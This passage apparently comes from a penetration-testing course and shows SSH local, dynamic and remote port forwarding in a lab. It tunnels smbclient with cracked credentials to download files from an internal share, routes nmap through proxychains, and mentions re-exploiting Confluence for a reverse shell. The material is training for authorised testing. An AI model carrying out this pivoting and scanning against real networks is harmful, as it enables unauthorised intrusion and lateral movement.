### SSH Local Port Forwarding

**Figure 247: The SSH Local Port Forward Setup, with the Command Running on CONFLUENCE01**

We can now interact with port 4455 on CONFLUENCE01 from our Kali machine. Let's start by listing the available shares using the `smbclient` command with the `-L` option, specifying the custom port 4455 with the `-p` option, and providing the username and password with the `-U` and `--password` options, respectively. We will use the credentials for the `hr_admin` user that we cracked from the Confluence database.

```bash
kali@kali:~$ smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

**Output:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
scripts         Disk
Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

**Listing 539: Listing SMB Shares through the SSH Local Port Forward Running on CONFLUENCE01**

We find a share called `scripts`, which we will likely be able to access. Let’s try to list what’s inside it and download any files we find.

```bash
kali@kali:~$ smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
Try "help" to get a list of possible commands.
smb: \> ls
. D 0 Thu Aug 18 22:21:24 2022
.. DR 0 Thu Aug 18 19:42:49 2022
Provisioning.ps1 A 387 Thu Aug 18 22:21:52 2022
README.txt A 145 Thu Aug 18 22:22:40 2022
5319935 blocks of size 4096. 152141 blocks available
smb: \> get Provisioning.ps1
getting file \Provisioning.ps1 of size 387 as Provisioning.ps1 (0.6 KiloBytes/sec)
(average 0.6 KiloBytes/sec)
smb: \> y
```

**Listing 540: Listing Files in the `scripts` Share, Using `smbclient` Over Our SSH Local Port Forward Running on CONFLUENCE01**

We can now inspect this file directly on our Kali machine.

In this section, by creating an SSH local port forward, we have been able to download a file stored in a share on a host deeper inside the corporate network.

### SSH Dynamic Port Forwarding

Local port forwarding has a significant limitation: we can only connect to one socket per SSH connection. This can make it quite tedious to use at scale. Fortunately, OpenSSH also provides dynamic port forwarding. From a single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to.

**Figure 248: The SSH Dynamic Port Forward Setup**

The layout is very similar to SSH local port forwarding. We are listening on TCP port 9999 on the WAN interface of CONFLUENCE01. Packets sent to this port (in SOCKS format) are pushed through the SSH tunnel to PGDATABASE01, then forwarded wherever they are addressed. This means we can still access the SMB port on HRSHARES, but we can also access any other port on any other host that PGDATABASE01 has access to, through this single port.

However, to take advantage of this flexibility, we need to ensure that the software we use can send packets in the correct SOCKS protocol format.

Let’s extend the previous scenario. In addition to connecting to the SMB port on HRSHARES, we also want to perform a full port scan of HRSHARES.

We can ensure that we are in a TTY shell using Python3’s `pty` module. We will create our SSH connection to PGDATABASE01 using the `database_admin` credentials again. In OpenSSH, a dynamic port forward is created with the `-D` option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We don’t have to specify a socket address to forward to. We’ll also pass the `-N` flag to prevent a shell from being spawned.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999 PI:EMAIL
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
PI:EMAIL's password:
```

**Listing 541: Opening the SSH Dynamic Port Forward on Port 9999**

As with the previous example, we don’t receive any immediate output after entering the password.

To manually confirm that port 9999 is listening on CONFLUENCE01, we would exploit the Confluence vulnerability again to get another reverse shell (since our existing shell is tied up with the SSH port forward command), then run `ss` in that shell.

Let’s connect to port 445 on HRSHARES through the SOCKS proxy port created by our SSH dynamic port forward command.

To accomplish this, we’ll use `smbclient` again. However, `smbclient` doesn’t natively provide an option to use a SOCKS proxy. Without a native option to use a SOCKS proxy in `smbclient`, we can’t take advantage of our dynamic port forward. The SOCKS proxy can’t determine how to handle traffic that isn’t encapsulated in the SOCKS protocol format.

To use `smbclient` in this situation, we’ll leverage Proxychains. Proxychains is a tool that can force network traffic from third-party tools over HTTP or SOCKS proxies. As the name suggests, it can also be configured to push traffic over a chain of concurrent proxies.

Proxychains works by using the Linux shared object preloading technique (`LD_PRELOAD`) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server. This means it might not work for everything, but will work for most dynamically-linked binaries that perform simple network operations. It won’t work on statically-linked binaries.

Let’s try Proxychains with `smbclient`. Proxychains uses a configuration file for almost everything, stored by default at `/etc/proxychains4.conf`. We need to edit this file to ensure that Proxychains can locate our SOCKS proxy port and confirm that it’s a SOCKS proxy (rather than any other kind of proxy). By default, proxies are defined at the end of the file. We can simply replace any existing proxy definition in that file with a single line defining the proxy type, IP address, and port of the SOCKS proxy running on CONFLUENCE01 (e.g., `socks5 192.168.50.63 9999`).

Although we specify `socks5` in this example, it could also be `socks4`, since SSH supports both. SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.

After editing the file, it should appear as follows:

```bash
kali@kali:~$ tail /etc/proxychains4.conf
# proxy types: http, socks4, socks5, raw
# * raw: The traffic is simply forwarded to the proxy without modification.
# ( auth types supported: "basic"-http "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5 192.168.50.63 9999
```

**Listing 542: The Proxychains Configuration File, Pointing Towards the SOCKS Proxy Set Up on CONFLUENCE01**

With Proxychains configured, we can now list the available shares on HRSHARES using `smbclient` from our Kali machine. Rather than connecting to the port on CONFLUENCE01, we’ll write the `smbclient` command as though we have a direct connection to PGDATABASE01. As before, we will specify `-L` to list the available shares, pass the username with `-U`, and password with `--password`.

Next, we can simply prepend `proxychains` to the command. Proxychains will read the configuration file, hook into the `smbclient` process, and force all traffic through the SOCKS proxy we specified.

```bash
kali@kali:~$ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:445 ... OK
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
scripts         Disk
Users           Disk
Reconnecting with SMB1 for workgroup listing.
[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:139 ... OK
[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:139 ... OK
do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Listing 543: `smbclient` Connecting to HRSHARES Through the SOCKS Proxy Using Proxychains**

The connection was a success! We’ve managed to connect to HRSHARES and list its shares, including an interesting folder called `scripts`. We receive some extra output from Proxychains too, including the ports that were interacted with while the process was running.

Let’s escalate this and port scan HRSHARES through our SOCKS proxy using Nmap. We’ll use a TCP-connect scan (`-sT`), skip DNS resolution (`-n`), skip the host discovery stage (`-Pn`), and only check the top 20 ports (`--top-ports=20`). We will then prepend `proxychains` to the command again to push all packets through the SSH dynamic port forward SOCKS proxy. We’ll also increase the verbosity using `-vvv`.

Nmap has a built-in `--proxies` option. However, according to its documentation, it’s “still under development” and not suitable for port scanning. As such, we use Proxychains again in this example.

```bash
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 17:26 EDT
Initiating Parallel DNS resolution of 1 host. at 17:26
Completed Parallel DNS resolution of 1 host. at 17:26, 0.09s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:26
Scanning 172.16.50.217 [20 ports]
[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:111 <--socket error or timeout!
[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:22 <--socket error or timeout!
...
[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:5900 <--socket error or timeout!
Completed Connect Scan at 17:30, 244.33s elapsed (20 total ports)
Nmap scan report for 172.16.50.217
Host is up, received user-set (9.0s latency).
Scanned at 2022-08-20 17:26:47 EDT for 244s
PORT     STATE    SERVICE      REASON
21/tcp   closed   ftp          conn-refused
22/tcp   closed   ssh          conn-refused
23/tcp   closed   telnet       conn-refused
25/tcp   closed   smtp         conn-refused
53/tcp   closed   domain       conn-refused
80/tcp   closed   http         conn-refused
110/tcp  closed   pop3         conn-refused
111/tcp  closed   rpcbind      conn-refused
135/tcp  open     msrpc        syn-ack
139/tcp  open     netbios-ssn  syn-ack
143/tcp  closed   imap         conn-refused
443/tcp  closed   https        conn-refused
445/tcp  open     microsoft-ds syn-ack
993/tcp  closed   imaps        conn-refused
995/tcp  closed   pop3s        conn-refused
1723/tcp closed   pptp         conn-refused
3306/tcp closed   mysql        conn-refused
3389/tcp open     ms-wbt-server syn-ack
5900/tcp closed   vnc          conn-refused
8080/tcp closed   http-proxy   conn-refused
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 244.62 seconds
```

**Listing 544: The Nmap-over-Proxychains Command Output**

The scan was a success! Proxychains gives us insight into each socket that was attempted and, if the connection failed, notes how. Nmap found TCP ports 135, 139, 445, and 3389 are open.

By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the `tcp_read_time_out` and `tcp_connect_time_out` values in the Proxychains configuration file will force Proxychains to time out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.

In this section, we set up a dynamic port forward and used Proxychains to push traffic from both `smbclient` and Nmap through the SOCKS proxy port that was created. We subsequently managed to list the shares on, as well as port scan, HRSHARES.

### SSH Remote Port Forwarding

In our examples so far, we’ve been able to connect to any port we bind on the WAN interface of CONFLUENCE01. This is more challenging in the real world because, more often than not, firewalls—both hardware and software—are likely to get in the way. Inbound traffic is often controlled much more aggressively than outbound traffic. Only in rare cases will we compromise credentials for an SSH user, allowing us to SSH directly into a network and port forward. We will only very rarely be able to access ports that we bind to a network perimeter.

However, we will more often be able to SSH out of a network. Outbound connections are more difficult to control than inbound connections. Most corporate networks will allow many types of common network traffic out, including SSH, for reasons of simplicity, usability, and business need. So while it likely won’t be possible to connect to a port we bind to the network perimeter, it will often be possible to SSH out.

This is where SSH remote port forwarding can be extremely useful. In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server and bind the listening port there. We can think of it like a reverse shell, but for port forwarding.

While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding occurring from the client to the server, it occurs from the server to the client.